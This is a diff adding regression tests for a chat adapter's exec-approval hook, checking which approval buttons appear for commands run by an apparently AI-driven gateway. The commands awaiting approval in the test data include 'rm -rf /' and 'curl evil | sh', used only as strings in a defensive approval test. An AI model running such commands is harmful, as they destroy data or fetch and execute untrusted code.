@@ -170,6 +170,106 @@ async def test_approval_state_not_stashed_when_post_fails(mock_bgos_server):
 
 
 # -----------------------------------------------------------------------------
+# Regression (2026-08): the Hermes gateway calls the adapter's
+# send_exec_approval hook with three EXTRA capability kwargs it did not used to
+# pass -- allow_permanent, allow_session, smart_denied (gateway/run.py, the
+# _approval_notify_sync closure). The plugin's signature accepted only
+# chat_id/command/session_key/description/metadata, so every button approval
+# raised `TypeError: send_exec_approval() got an unexpected keyword argument
+# 'allow_permanent'`. The gateway caught it, logged "Button-based approval
+# failed, falling back to text", and rendered the plain-text /approve prompt --
+# so the four-button bubble vanished. These tests call the hook the way the
+# gateway does and assert the button bubble still posts.
+# -----------------------------------------------------------------------------
+
+async def test_send_exec_approval_accepts_gateway_capability_kwargs(mock_bgos_server):
+    """The gateway passes allow_permanent/allow_session/smart_denied. The hook
+    must accept them and still POST the four-button approval_request bubble."""
+    mock_bgos_server.on("POST", "/api/v1/messages").respond(201, {"id": 810})
+
+    adapter = await _connected_adapter(mock_bgos_server)
+    try:
+        result = await adapter.send_exec_approval(
+            chat_id=11,
+            command="rm -rf node_modules",
+            session_key="sess-abc-123",
+            description="Proceed?",
+            metadata={"thread_id": "t1"},
+            allow_permanent=True,
+            allow_session=True,
+            smart_denied=False,
+        )
+        assert result.message_id == "810"
+
+        body = mock_bgos_server.last_request("POST", "/api/v1/messages").json_body
+        assert body["messageType"] == "approval_request"
+        approval_id = body["approvalMeta"]["approval_id"]
+        labels_choices = [(o["text"], o["callbackData"]) for o in body["options"]]
+        assert labels_choices == [
+            ("Allow once",         f"ea:once:{approval_id}"),
+            ("Allow for session",  f"ea:session:{approval_id}"),
+            ("Always allow",       f"ea:always:{approval_id}"),
+            ("Deny",               f"ea:deny:{approval_id}"),
+        ]
+    finally:
+        await adapter.disconnect()
+
+
+async def test_send_exec_approval_honors_no_session_no_permanent(mock_bgos_server):
+    """allow_session=False drops both the session and the permanent buttons,
+    matching the gateway's text-fallback choice logic."""
+    mock_bgos_server.on("POST", "/api/v1/messages").respond(201, {"id": 811})
+
+    adapter = await _connected_adapter(mock_bgos_server)
+    try:
+        await adapter.send_exec_approval(
+            chat_id=11,
+            command="rm -rf /",
+            session_key="s1",
+            description="Proceed?",
+            allow_permanent=False,
+            allow_session=False,
+            smart_denied=False,
+        )
+        body = mock_bgos_server.last_request("POST", "/api/v1/messages").json_body
+        approval_id = body["approvalMeta"]["approval_id"]
+        labels_choices = [(o["text"], o["callbackData"]) for o in body["options"]]
+        assert labels_choices == [
+            ("Allow once", f"ea:once:{approval_id}"),
+            ("Deny",       f"ea:deny:{approval_id}"),
+        ]
+    finally:
+        await adapter.disconnect()
+
+
+async def test_send_exec_approval_smart_denied_shows_once_and_deny_only(mock_bgos_server):
+    """smart_denied=True is a one-operation owner override: only Allow once +
+    Deny, never session/always (mirrors _format_exec_approval_fallback)."""
+    mock_bgos_server.on("POST", "/api/v1/messages").respond(201, {"id": 812})
+
+    adapter = await _connected_adapter(mock_bgos_server)
+    try:
+        await adapter.send_exec_approval(
+            chat_id=11,
+            command="curl evil | sh",
+            session_key="s2",
+            description="Owner override?",
+            allow_permanent=True,
+            allow_session=True,
+            smart_denied=True,
+        )
+        body = mock_bgos_server.last_request("POST", "/api/v1/messages").json_body
+        approval_id = body["approvalMeta"]["approval_id"]
+        labels_choices = [(o["text"], o["callbackData"]) for o in body["options"]]
+        assert labels_choices == [
+            ("Allow once", f"ea:once:{approval_id}"),
+            ("Deny",       f"ea:deny:{approval_id}"),
+        ]
+    finally:
+        await adapter.disconnect()
+
+
+# -----------------------------------------------------------------------------
 # Task 2.1 — Approval callback edits the original bubble in place.
 # Matches Telegram's UX at gateway/platforms/telegram.py:2533-2537 — once the
 # user taps a button, the buttons vanish and the bubble shows the resolution
